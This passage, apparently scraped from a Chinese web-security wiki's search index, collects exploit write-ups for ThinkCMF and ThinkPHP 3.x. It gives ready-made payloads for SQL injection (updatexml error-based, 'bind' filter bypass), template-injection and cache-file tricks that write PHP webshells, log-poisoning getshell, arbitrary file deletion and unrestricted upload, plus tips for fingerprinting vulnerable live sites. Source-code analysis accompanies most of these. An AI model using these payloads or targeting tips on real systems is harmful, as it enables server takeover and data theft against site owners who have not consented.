前台的文章编辑中操作框架注入，所以可以直接sql注入 url:http://thinkcmf.test/index.php?g=Portal&m=Article&a=edit_post post: term:123 post[post_title]:123 post[post_title]:aaa post_title:123 post[id][0]:bind post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) 0x01.2 漏洞原理 文件：ThinkCMFX_2.2.3\\application\\Portal\\Controller\\ArticleController.class.php 方法：public function edit_post( 这里不多讲，因为没得意义。详情请看先知的历史tp漏洞，谢谢：) 0x02 前台模版注入漏洞-可getshell两处 0x02.1 Comment类模版引擎注入演示 url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=file_put_contents('test.php',' 发送之后页面http状态会为200，这样就表示成功了 简单讲解一下：content 我输入了php代码所以他会在本地跟路径创建一个一句话木马test.php 所以实战过程中。 连接马子：http://xxxxx.com/test.php 密码:11 即可getshell 0x02.2 Api类模版注入1 url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=file_put_contents('test1.php',' 同上一样，会在跟目录生成 马子 test1.php 0x02.3 漏洞原理 路径:ThinkCMFX\\application\\Comment\\Controller\\WidgetController.class.php 路径:ThinkCMFX\\application\\Api\\Controller\\PluginController.class.php 两处的漏洞原理都是一样的，所以我就选一处进行讲解了 路径:application\\Comment\\Controller\\WidgetController.class.php 方法：public function fetch() 从名字查看我们会发现他的3个参数 $templateFile=模版地址 $content=内容 $prefix=前缀 $templateFile就是我们要包含的文件了，我们必须包含一个不然，代码会报错，导致无法写shell $content 我们写马子的地方 $prefix 忽略他即可，没有用的 在代码中我们看到一个 $templateFile 给parseTemplate函数包含了，这里我们也不用管他，因为他的作用就是判断一下文件是否存在而已，所以我们在实战的时候，可以找到一处html文件包含即可 而tp的模版引擎 使用的是 smarty 而smarty中只要可控制内容的key 与 value 即可写入shell命令，所以同理可得，tp的 $content 我们可控 = 有模版注入 0x03 任意文件删除-只能windows删除 0x03.1 漏洞演示 url：http://thinkcmf.test/index.php?g=User&m=Profile&a=do_avatar post: mgurl=..\\..\\..\\..\\..\\1.txt 0x03.2 漏洞原理 路径：ThinkCMFX\\application\\User\\Controller\\ProfileController.class.php 方法：blic function do_avatar( 从文件可以看到 $imgurl=str_replace(\\'/\\',\\'\\',$imgurl); 过滤了 / 但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数 imgurl 带入函数sp_delete_avatar 跟进去 路径：ThinkCMFX\\application\\Common\\Common\\function.php 方法：function sp_delete_avatar( 0x04 前台任意上传漏洞 0x04.1 漏洞演示 记得一定要登录! 记得一定要登录! 记得一定要登录! 记得在前台注册一个账号进行登录或是直接登录后台然后在访问此地址 打开url: http://atest.test/cms/ThinkCMFX_2.2.3/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile POST: file = php一句话木马的文件 1.php shell地址: http://atest.test/cms/ThinkCMFX_2.2.3/data/upload/ueditor/20190724/5d3833dcce7e3.php?1=phpinfo(); 0x04.2 为什么要登录 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：public function _initialize() 0x04.3 漏洞原理 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：public function upload( 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：private function _ueditor_upload 该方法使用 $upload_setting=sp_get_upload_setting(); 先获取所有上传的配置 在用 $allowed_exts=explode(\\',\\', $upload_setting[$filetype]); 来获取允许上传的后缀 这里我们先跟进去查看 sp_get_upload_setting(); 函数 路径：application\\Common\\Common\\function.php 方法：function sp_get_upload_setting() 接下来我们需要重点查看一下：$upload_setting[$filetype] 我们可以打印一下,看看他的返回值 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload( 代码: $upload_setting[$filetype] 然后我们在看看他的代码 $allowed_exts=explode(\\',\\', $upload_setting[$filetype]); 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload( 代码: $allowed_exts=explode(\\',\\', $upload_setting[$filetype]); $upload_setting[$filetype] 执行以后返回的结果是数组并且为2: array(2) { [\"upload_max_filesize\"]=> string(5) \"10240\" [\"extensions\"]=> string(42) \"txt,pdf,doc,docx,xls,xlsx,ppt,pptx,zip,rar\" } 而这里用了php函数: explode 让我们看看这个函数的作用 把字符串转成数组,可是他返回的就是数组所以 $allowed_exts=explode(\\',\\', $upload_setting[$filetype]); 执行返回空 让我们测试一下看看 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload() 跟进去tp的上传方法查看一下 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：public function upload() 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：private function check() 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：private function checkExt() 因为这里返回了true所以实际上他并没有验证后缀 所以我们也就多了一个任意文件上传漏洞 0x05 使用说明 前面说了，thinkcmf 并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。 1，看logo 3的logo是黄色的例如下图 2，在网站url 后面输入 admin 如果页面是蓝色的表示是3的，可日穿之 3，查看 README.md 在网站url后面输入README.md 另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个错 url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=file_put_contents('test.php',' 请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可 例如： /../public/index /../public/exception /../data/index /../data/runtime/index /../plugins/Mobileverify/View/admin_index /../plugins/Mobileverify/View/index /../plugins/Mobileverify/View/widget /../plugins/Demo/View/admin_index /../plugins/Demo/View/index /../plugins/Demo/View/widget /../application/Install/View/Public/footer /../application/Install/View/Public/head /../application/Install/View/Public/header /../application/Common/index /../application/Portal/Lang/en-us/index /../application/Api/Lang/en-us/index /../application/Api/Lang/zh-cn/index /../application/Comment/Lang/en-us/index /../application/Comment/Lang/zh-cn/index url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=file_put_contents('test1.php',' /../../../public/index /../../../public/exception /../../../data/index /../../../data/runtime/index /../../../plugins/Mobileverify/View/admin_index /../../../plugins/Mobileverify/View/index /../../../plugins/Mobileverify/View/widget /../../../plugins/Demo/View/admin_index /../../../plugins/Demo/View/index /../../../plugins/Demo/View/widget /../../../application/Install/View/Public/footer /../../../application/Install/View/Public/head /../../../application/Install/View/Public/header /../../../application/Common/index /../../../application/Portal/Lang/en-us/index /../../../application/Api/Lang/en-us/index /../../../application/Api/Lang/zh-cn/index /../../../application/Comment/Lang/en-us/index /../../../application/Comment/Lang/zh-cn/index 还有最后一句废话：模版注入对于linux 并不好用 : ) 差不多了，剩下的自己去thinkcmf里面自己找 四、参考链接 文章来源于https://www.yuque.com/pmiaowu/bfgkkh/aiiak1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:16 "},"Web安全/ThinkCMF/ThinkCMF任意内容包含漏洞getshell/ThinkCMF任意内容包含漏洞getshell.html":{"url":"Web安全/ThinkCMF/ThinkCMF任意内容包含漏洞getshell/ThinkCMF任意内容包含漏洞getshell.html","title":"ThinkCMF任意内容包含漏洞getshell","keywords":"","body":"ThinkCMF 任意内容包含getshell漏洞 漏洞描述 ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展 每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时是如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本 漏洞介绍 远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码 漏洞影响 ThinkCMF X1.6.0ThinkCMF X2.1.0ThinkCMF X2.2.0ThinkCMF X2.2.1ThinkCMF X2.2.2 FOFA title=\"ThinkCMF\" 漏洞分析 环境搭建 ThinkCMFX2.2.2下载链接：https://pan.baidu.com/s/1rK1-_BLmH1VPXsIUfr1VUw 提取码：wuhw 将下载好的ThinkCMF解压后放在WWW目录下，然后浏览器访问即可看到安装页面 安装好之后访问页面为 漏洞分析 首先打开index.php文件，查看程序的项目路径，可以看到项目路径在application目录下 在项目路径下找到入口分组的控制器类选择IndexController 控制器类打开，可以知道继承了HomebaseController，通过gma参数指定分组模块方法，这里可以通过a参数直接调用PortalIndexController父类(HomebaseController)中的一些权限为public的方法 可以看的的public方法里就有display()、fetch(),还有方法作用及参数含义 display函数 (可以自定义加载模版，通过$this->parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配) 的作用是加载模板和页面输出，所对应的参数为：templateFile为模板文件地址，charset模板字符集，contentType输出类型，content输出内容 templateFile参数会经过parseTemplate()方法处理 在applicationCommonControllerAdminbaseController.class.php的parseTemplate()方法如下 parseTemplate()方法作用：判断模板主题是否存在，当模板主题不存在时会在当前目录下开始查找，形成文件包含 构造的payload为 ：index.php?a=display&templateFile=README.md 这里fetch函数的三个参数分别对应模板文件，输出内容，模板缓存前缀。利用时templateFile和prefix参数可以为空，在content参数传入待注入的php代码即可 漏洞复现 1.通过构造a参数的display()方法，实现任意内容包含漏洞 ?a=display&templateFile=README.md 2.通过构造a参数的fetch()方法，在不需要知道文件路径的情况下就可以实现任意文件写入 ?a=fetch&templateFile=public/index&prefix=''&content=file_put_contents('1.php','') 执行paylaod，如果页面是空白的，则说明可能写入成功 3.访问写入的文件1.php，发现成功写入文件 ThinkCMF缓存getshell 由于thinkcmf2.x使用了thinkphp3.x作为开发框架，默认情况下启用了报错日志并且开启了模板缓存，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马m.php `` \\有两种方式可以getshell** \\第一种方法** ?a=display&templateFile=');die();?> 发送请求，thinkphp生成的日志的格式为 年-月份-日期 (请求的日期) http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log 可以看到已经成功创建了shell.php文件 然后使用蚁剑成功连接 第二种方法 发送以下请求 http://target.domain/?a=display&templateFile= 然后直接使用一句话管理工具连接 http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log 修复方法 将 HomebaseController.class.php 和 AdminbaseController.class.php 类中 display 和 fetch 函数的修饰符改为 protected Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:24 "},"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.1.3_sql注入漏洞/Thinkphp_3.1.3_sql注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.1.3_sql注入漏洞/Thinkphp_3.1.3_sql注入漏洞.html","title":"Thinkphp_3.1.3_sql注入漏洞","keywords":"","body":"Thinkphp 3.1.3 sql注入漏洞 一、漏洞简介 二、漏洞影响 Thinkphp 3.1.3 三、复现过程 首先在网上下载对应的压缩包。 漏洞位于ThinkPHP/Lib/Core/Model.class.php 文件的parseSql函数 将这一条修复语句注释后开始一步步复现 在ThinkPHP目录下创建app文件夹后创建index.php 访问相应页面，显示这个则说明成功。 成功后app文件夹下会生成工程文件 然后开始配置数据库(在app/conf/config.php下配置) '配置值' // 添加数据库配置信息 'DB_TYPE' => 'mysql', // 数据库类型 'DB_HOST' => 'localhost', // 服务器地址 'DB_NAME' => 'security', // 数据库名 'DB_USER' => 'root', // 用户名 'DB_PWD' => 'root', // 密码 'DB_PORT' => 3306, // 端口 'DB_PREFIX' => 'think_', // 数据库表前缀 ); ?> 下一步开始为模块定义一个控制器类:IndexAction.class.php。命名规范（模块名+Action.class.php） name = 'thinkphp'; // 进行模板变量赋值 //$this->display(); $Data = M('Data'); // 实例化Data数据模型 $this->data = $Data->select(); $this->display(); $model=M('think_data'); $m=$model->query('select * from think_data where id=\"%s\"',array($_GET['id'])); dump($m);exit; } } 创建视图：在./Tpl下创建Index/index.html //hello, {$name}! {$vo.id}--{$vo.data} 在浏览器访问 https://www.0-sec.org:9090/ThinkPHP_3.1.3_full/ThinkPHP/app/ https://www.0-sec.org:9090/ThinkPHP_3.1.3_full/ThinkPHP/app/?id=1\" or 1 – 复现结束 参考连接 https://www.freesion.com/article/3289785672/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:56 "},"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_select&find&delete注入漏洞/Thinkphp_3.2.3_select&find&delete注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_select&find&delete注入漏洞/Thinkphp_3.2.3_select&find&delete注入漏洞.html","title":"Thinkphp_3.2.3_select&find&delete注入漏洞","keywords":"","body":"Thinkphp 3.2.3 select&find&delete 注入漏洞 一、漏洞简介 二、漏洞影响 \\ 三、复现过程 漏洞分析 通过github上的commit 对比其实可以粗略知道，此次更新主要是在ThinkPHP/Library/Think/Model.class.php文件中，其中对于delete，find，select三个函数进行了修改。 delete函数 select函数 find函数 对比三个方法修改的地方都有一个共同点： 把外部传进来的$options，修改为$this->options，同时不再使用$this->_parseOptions对于$options进行表达式分析。 思考是因为$options可控，再经过_parseOptions函数之后产生了sql注入。 一 select 和 find 函数 以find函数为例进行分析（select代码类似），该函数可接受一个$options参数，作为查询数据的条件。 当$options为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段： if (is_numeric($options) || is_string($options)) { $where[$this->getPk()] = $options; $options = array(); $options['where'] = $where; } 同时提供了对复合主键的查询，看到判断： if (is_array($options) && (count($options) > 0) && is_array($pk)) { // 根据复合主键查询 ...... } 要进入复合主键查询代码，需要满足$options为数组同时$pk主键也要为数组，但这个对于表只设置一个主键的时候不成立。 那么就可以使$options为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入_parseOptions进行解析。 if (is_numeric($options) || is_string($options)) {//$options为数组不进入 $where[$this->getPk()] = $options; $options = array(); $options['where'] = $where; } // 根据复合主键查找记录 $pk = $this->getPk(); if (is_array($options) && (count($options) > 0) && is_array($pk)) { //$pk不为数组不进入 ...... } // 总是查找一条记录 $options['limit'] = 1; // 分析表达式 $options = $this->_parseOptions($options); //解析表达式 // 判断查询缓存 ..... $resultSet = $this->db->select($options); //底层执行 之后跟进_parseOptions方法，（分析见代码注释） if (is_array($options)) { //当$options为数组的时候与$this->options数组进行整合 $options = array_merge($this->options, $options); } if (!isset($options['table'])) {//判断是否设置了table 没设置进这里 // 自动获取表名 $options['table'] = $this->getTableName(); $fields = $this->fields; } else { // 指定数据表 则重新获取字段列表 但不支持类型检测 $fields = $this->getDbFields(); //设置了进这里 } // 数据表别名 if (!empty($options['alias'])) {//判断是否设置了数据表别名 $options['table'] .= ' ' . $options['alias']; //注意这里，直接拼接了 } // 记录操作的模型名称 $options['model'] = $this->name; // 字段类型验证 if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) { //让$optison['where']不为数组或没有设置不进这里 // 对数组查询条件进行字段类型检查 ...... } // 查询过后清空sql表达式组装 避免影响下次查询 $this->options = array(); // 表达式过滤 $this->_options_filter($options); return $options; $options我们可控，那么就可以控制为数组类型，传入$options['table']或$options['alias']等等，只要提层不进行过滤都是可行的。 同时我们可以不设置$options['where']或者设置$options['where']的值为字符串，可绕过字段类型的验证。 可以看到在整个对$options的解析中没有过滤，直接返回，跟进到底层ThinkPHP\\Libray\\Think\\Db\\Diver.class.php，找到select方法，继续跟进最后来到parseSql方法，对$options的值进行替换，解析。 因为$options['table']或$options['alias']都是由parseTable函数进行解析，跟进： if (is_array($tables)) {//为数组进 // 支持别名定义 ...... } elseif (is_string($tables)) {//不为数组进 $tables = array_map(array($this, 'parseKey'), explode(',', $tables)); } return implode(',', $tables); 当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。 同时$options['where']也一样，看到parseWhere函数 $whereStr = ''; if (is_string($where)) { // 直接使用字符串条件 $whereStr = $where; //直接返回了，没有任何过滤 } else { // 使用数组表达式 ...... } return empty($whereStr) ? '' : ' WHERE ' . $whereStr; 二 delete函数 delete函数有些不同，主要是在解析完$options之后，还对$options['where']判断了一下是否为空，需要我们传一下值，使之不为空,从而继续执行删除操作。 ...... // 分析表达式 $options = $this->_parseOptions($options); if (empty($options['where'])) { //注意这里，还判断了一下$options['where']是否为空，为空直接返回，不再执行下面的代码。 // 如果条件为空 不进行删除操作 除非设置 1=1 return false; } if (is_array($options['where']) && isset($options['where'][$pk])) { $pkValue = $options['where'][$pk]; } if (false === $this->_before_delete($options)) { return false; } $result = $this->db->delete($options); if (false !== $result && is_numeric($result)) { $data = array(); if (isset($pkValue)) { $data[$pk] = $pkValue; } $this->_after_delete($data, $options); } // 返回删除记录个数 return $result; 漏洞复现 针对select() 和find()方法 ,有很多地方可注，这里主要列举三个table，alias，where，更多还请自行跟踪一下parseSql的各个parseXXX方法，目测都是可行的，比如having,group等。 table：http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- alias：http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- where: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- 而delete()方法的话同样，这里粗略举三个例子，table,alias,where，但使用table和alias的时候，同时还必须保证where不为空（详细原因后面会说） where: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- alias: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- table: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&id[where]=1 参考链接 https://xz.aliyun.com/t/2629#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:58 "},"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_update注入漏洞/Thinkphp_3.2.3_update注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_update注入漏洞/Thinkphp_3.2.3_update注入漏洞.html","title":"Thinkphp_3.2.3_update注入漏洞","keywords":"","body":"Thinkphp 3.2.3 update注入漏洞 一、漏洞简介 thinkphp是国内著名的php开发框架，有完善的开发文档，基于MVC架构，其中Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是普及度高于新出的thinkphp5系列，由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入。 二、漏洞影响 \\ 三、复现过程 这个问题很早之前就注意到了，只是一直没找到更常规的写法去导致注入的产生，在挖掘框架漏洞的标准是在使用官方的标准开发方式的前提下也会产生可以用的漏洞，这样才算框架级漏洞，跟普通的业务代码漏洞是有严格界线的。 thinkphp系列框架过滤表达式注入多半采用I函数去调用think_filter function think_filter(&$value){ if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)) 有没有相关tips来达到I函数绕过呢？是可以的。 http://document.thinkphp.cn/manual_3_2.html#update_data 一般按照官方的写法，thinkphp提供了数据库链式操作，其中包含连贯操作和curd操作，在进行数据库CURD操作去更新数据的时候： 举例update数据操作。 where制定主键的数值，save方法去更新变量传进来的参数到数据库的指定位置。 public function where($where,$parse=null){ if(!is_null($parse) && is_string($where)) { if(!is_array($parse)) { $parse = func_get_args(); array_shift($parse); } $parse = array_map(array($this->db,'escapeString'),$parse); $where = vsprintf($where,$parse); }elseif(is_object($where)){ $where = get_object_vars($where); } if(is_string($where) && '' != $where){ $map = array(); $map['_string'] = $where; $where = $map; } if(isset($this->options['where'])){ $this->options['where'] = array_merge($this->options['where'],$where); }else{ $this->options['where'] = $where; } return $this; } 通过where方法获取where()链式中进来的参数值，并对参数进行检查，是否为字符串，tp框架默认是对字符串进行过滤的 public function save($data='',$options=array()) { if(empty($data)) { // 没有传递数据，获取当前数据对象的值 if(!empty($this->data)) { $data = $this->data; // 重置数据 $this->data = array(); }else{ $this->error = L('_DATA_TYPE_INVALID_'); return false; } } // 数据处理 $data = $this->_facade($data); if(empty($data)){ // 没有数据则不执行 $this->error = L('_DATA_TYPE_INVALID_'); return false; } // 分析表达式 $options = $this->_parseOptions($options); $pk = $this->getPk(); if(!isset($options['where']) ) { // 如果存在主键数据 则自动作为更新条件 if (is_string($pk) && isset($data[$pk])) { $where[$pk] = $data[$pk]; unset($data[$pk]); } elseif (is_array($pk)) { // 增加复合主键支持 foreach ($pk as $field) { if(isset($data[$field])) { $where[$field] = $data[$field]; } else { // 如果缺少复合主键数据则不执行 $this->error = L('_OPERATION_WRONG_'); return false; } unset($data[$field]); } } if(!isset($where)){ // 如果没有任何更新条件则不执行 $this->error = L('_OPERATION_WRONG_'); return false; }else{ $options['where'] = $where; } } if(is_array($options['where']) && isset($options['where'][$pk])){ $pkValue = $options['where'][$pk]; } if(false === $this->_before_update($data,$options)) { return false; } $result = $this->db->update($data,$options); if(false !== $result && is_numeric($result)) { if(isset($pkValue)) $data[$pk] = $pkValue; $this->_after_update($data,$options); } return $result; } 再来到save方法，通过前面的数据处理解析服务端数据库中的数据字段信息，字段数据类型，再到_parseOptions表达式分析，获取到表名，数据表别名，记录操作的模型名称，再去调用回调函数进入update 我们这里先直接看框架的where子单元函数，之前网上公开的exp表达式注入就是从这里分析出来的结论： Thinkphp/Library/Think/Db/Driver.class.php // where子单元分析 protected function parseWhereItem($key,$val) { $whereStr = ''; if(is_array($val)) { if(is_string($val[0])) { $exp = strtolower($val[0]); if(preg_match('/^(eq|neq|gt|egt|lt|elt)$/',$exp)) { // 比较运算 $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($val[1]); }elseif(preg_match('/^(notlike|like)$/',$exp)){// 模糊查找 if(is_array($val[1])) { $likeLogic = isset($val[2])?strtoupper($val[2]):'OR'; if(in_array($likeLogic,array('AND','OR','XOR'))){ $like = array(); foreach ($val[1] as $item){ $like[] = $key.' '.$this->exp[$exp].' '.$this->parseValue($item); } $whereStr .= '('.implode(' '.$likeLogic.' ',$like).')'; } }else{ $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($val[1]); } }elseif('bind' == $exp ){ // 使用表达式 $whereStr .= $key.' = :'.$val[1]; }elseif('exp' == $exp ){ // 使用表达式 $whereStr .= $key.' '.$val[1]; }elseif(preg_match('/^(notin|not in|in)$/',$exp)){ // IN 运算 if(isset($val[2]) && 'exp'==$val[2]) { $whereStr .= $key.' '.$this->exp[$exp].' '.$val[1]; }else{ if(is_string($val[1])) { $val[1] = explode(',',$val[1]); } $zone = implode(',',$this->parseValue($val[1])); $whereStr .= $key.' '.$this->exp[$exp].' ('.$zone.')'; } }elseif(preg_match('/^(notbetween|not between|between)$/',$exp)){ // BETWEEN运算 $data = is_string($val[1])? explode(',',$val[1]):$val[1]; $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($data[0]).' AND '.$this->parseValue($data[1]); }else{ E(L('_EXPRESS_ERROR_').':'.$val[0]); } }else { $count = count($val); $rule = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : '' ; if(in_array($rule,array('AND','OR','XOR'))) { $count = $count -1; }else{ $rule = 'AND'; } for($i=0;$iparseWhereItem($key,$val[$i]).' '.$rule.' '; } } $whereStr = '( '.substr($whereStr,0,-4).' )'; } }else { //对字符串类型字段采用模糊匹配 $likeFields = $this->config['db_like_fields']; if($likeFields && preg_match('/^('.$likeFields.')$/i',$key)) { $whereStr .= $key.' LIKE '.$this->parseValue('%'.$val.'%'); }else { $whereStr .= $key.' = '.$this->parseValue($val); } } return $whereStr; } 其中除了exp能利用外还有一处bind，而bind可以完美避开了think_filter： elseif('bind' == $exp ){ // 使用表达式 $whereStr .= $key.' = :'.$val[1]; }elseif('exp' == $exp ){ // 使用表达式 $whereStr .= $key.' '.$val[1]; 这里由于拼接了$val参数的形式造成了注入，但是这里的bind表达式会引入:符号参数绑定的形式去拼接数据，通过白盒对几处CURD操作函数进行分析定位到update函数，insert函数会造成sql注入，于是回到上面的updateh函数。 Thinkphp/Library/Think/Db/Driver.class.php /** * 更新记录 * @access public * @param mixed $data 数据 * @param array $options 表达式 * @return false | integer */ public function update($data,$options) { $this->model = $options['model']; $this->parseBind(!empty($options['bind'])?$options['bind']:array()); $table = $this->parseTable($options['table']); $sql = 'UPDATE ' . $table . $this->parseSet($data); if(strpos($table,',')){// 多表更新支持JOIN操作 $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:''); } $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:''); if(!strpos($table,',')){ // 单表更新支持order和lmit $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'') .$this->parseLimit(!empty($options['limit'])?$options['limit']:''); } $sql .= $this->parseComment(!empty($options['comment'])?$options['comment']:''); return $this->execute($sql,!empty($options['fetch_sql']) ? true : false); } 跟进execute函数： public function execute($str,$fetchSql=false) { $this->initConnect(true); if ( !$this->_linkID ) return false; $this->queryStr = $str; if(!empty($this->bind)){ $that = $this; $this->queryStr = strtr($this->queryStr,array_map(function($val) use($that){ return '''.$that->escapeString($val).'''; },$this->bind)); } if($fetchSql){ return $this->queryStr; } 这里有处对$this->queryStr进行字符替换的操作： $this->queryStr = strtr($this->queryStr,array_map(function($val) use($that){ return '''.$that->escapeString($val).'''; },$this->bind)); 具体是什么，我这里写了一个实例： 常规的跟新数据库用户信息的操作： Application/Home/Controller/UserController.class.php where($user)->save($data); var_dump($valu); } } 根据进来的id更新用户的名字和钱，构造一个简单一个poc id[]=bind&id[]=1'&money[]=1123&user=liao 当走到execute函数时sql语句为： UPDATE `member` SET `user`=:0 WHERE `id` = :1' 然后$that = $this 然后下面的替换操作是将\":0\"替换为外部传进来的字符串，这里就可控了。 替换后： 明显发现之前的user参数为:0然后被替换为了liao，这样就把:替换掉了。 后面的:1明显是替换不掉的： 那么我们将id[1]数组的参数变为0呢？ id[]=bind&id[]=0%27&money[]=1123&user=liao 果然造成了注入： poc money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1)) 参考链接 https://www.anquanke.com/post/id/104847 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:00 "},"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_缓存漏洞/Thinkphp_3.2.3_缓存漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_缓存漏洞/Thinkphp_3.2.3_缓存漏洞.html","title":"Thinkphp3.2.3缓存漏洞","keywords":"","body":"Thinkphp 3.2.3 缓存漏洞 一、漏洞简介 二、漏洞影响 Thinkphp 3.2.3 三、复现过程 漏洞分析 直接跟进到/Library/Think/Cache/File.class.php文件，看到set方法： /** * 写入缓存 * @access public * @param string $name 缓存变量名 * @param mixed $value 存储数据 * @param int $expire 有效时间 0为永久 * @return boolean */ public function set($name,$value,$expire=null) { N('cache_write',1); if(is_null($expire)) { $expire = $this->options['expire']; } $filename = $this->filename($name); $data = serialize($value); if( C('DATA_CACHE_COMPRESS') && function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data,3); } if(C('DATA_CACHE_CHECK')) {//开启数据校验 $check = md5($data); }else { $check = ''; } $data = \"\"; //data参数经过序列化，直接被写到文件内。 $result = file_put_contents($filename,$data); if($result) { if($this->options['length']>0) { // 记录缓存队列 $this->queue($name); } clearstatcache(); return true; }else { return false; } } 写一个调用缓存函数的的方法，运行一下。看看写进去什么 namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $a=I('post.a3'); S('name',$a); } } 在set方法下断点，访问 http://www.0-sec.org/index.php/Home/Index/index.html ，post数据：a3=aaaa 可以看到$data参数经过序列化，直接写入php后缀的文件。F9运行可以看到，在Application/Runtime/Temp/文件夹下生成了php文件。 写入到文件被行注释了。 $data参数未过滤%0d%0a可以用换行来绕过行注释，尝试post数据： a3=%0d%0aeval($_POST['cmd']);%0d%0a// 之后用蚁剑连接成功 总结 Thinkphp3.2.3 漏洞文件位置(一般审计得出) http://www.0-sec.org/index.php/Home/Index/get?id=%0d%0aeval($_POST['cmd']);%0d%0a// 缓存文件为缓存名的md5值，这里采用md5（name）=b068931cc450442b63f5b3d276ea4297 http://www.0-sec.org/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php 之后蚁剑连接。 参考链接 https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:03 "},"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.x_order by注入漏洞/Thinkphp_3.x_order by注入漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.x_order by注入漏洞/Thinkphp_3.x_order by注入漏洞.html","title":"Thinkphp_3.x_order by注入漏洞","keywords":"","body":"Thinkphp 3.x order by 注入漏洞 一、漏洞简介 